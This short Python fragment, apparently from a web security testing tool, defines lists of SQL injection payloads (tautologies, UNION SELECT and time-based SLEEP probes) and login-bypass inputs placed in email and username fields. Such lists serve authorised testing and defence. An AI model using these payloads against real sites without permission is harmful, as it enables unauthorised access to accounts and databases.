SQLI_PAYLOADS = [
    "' OR '1'='1--",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "' AND SLEEP(3)--",
    "' OR IF(1=1, SLEEP(3), 0)--"
]

AUTH_BYPASS_PAYLOADS = [
    {"email": "' OR 1=1--", "password": "test"},
    {"username": "' OR 'a'='a", "password": "test"}
]
